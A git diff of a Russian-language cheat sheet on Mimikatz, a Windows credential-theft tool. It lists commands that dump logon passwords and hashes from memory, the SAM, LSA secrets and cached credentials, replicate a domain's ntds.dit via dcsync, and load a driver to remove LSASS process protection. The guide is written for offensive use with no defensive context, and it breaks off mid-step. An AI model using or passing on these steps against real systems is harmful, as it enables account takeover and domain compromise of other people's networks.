@@ -22,25 +22,29 @@ lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM
 После запуска Mimikatz можно использовать следующие команды для вытягивания паролей из памяти Windows:
 
 - `privilege::debug` - открывает привилегии отладки для текущего процесса.
-- token::elevate - повышение привелегий
+- `token::elevate` - повышение привелегий
 - `sekurlsa::logonPasswords` - выводит введенные пользователем логины и хэши паролей.
 - `lsadump::sam` - вытягивает пароли из базы данных SAM.
 - `lsadump::lsa` - вытягивает хэши паролей из дискового хранилища LSA.
-- lsadump::lsa /patch Сбросьте эти хэши!!
+- `lsadump::lsa` /patch Сбросьте эти хэши!!
 - `token::elevate` - поднимает привилегии на максимальный уровень.
 - `token::whoami` - выводит информацию о текущем пользователе.
--  lsadump::cache - mscash2 последних 10 пользователей из систем и секьюрити
-- lsadump::dcsync /all /csv - дампим ntds.dit с контроллера
+- `lsadump::cache` - mscash2 последних 10 пользователей из систем и секьюрити
+- `lsadump::dcsync` - /all /csv - дампим ntds.dit с контроллера
 Подробнее: https://www.securitylab.ru/analytics/517178.php
 
-- lsadump::secrets  - ntlm аккаунта машины
+- `lsadump::secrets`  - ntlm аккаунта машины
 
     --- Если Защищенный LSASS!!!!!!!!!!
-  
-          !+     -- загружаем mimidrv.sys   --- и тогда LSAS открыт
-  
-          !processprotect /process:lsass.exe /remove
-  
+
+  - `!+`     -- загружаем mimidrv.sys   
+  - `!processprotect /process:lsass.exe /remove`   --- и тогда LSAS открыт
+
+ - `sekurlsa::credman` - для выгрузки данных из credential manager
+
+
+
+
 Для получения данных из ntds.dit, аналогично команде lsadump::sam в инструменте Mimikatz, можно использовать следующие команды:
 
 1. Загрузите ntds.dit в память с помощью команды "lsadump::synchronize". Например:
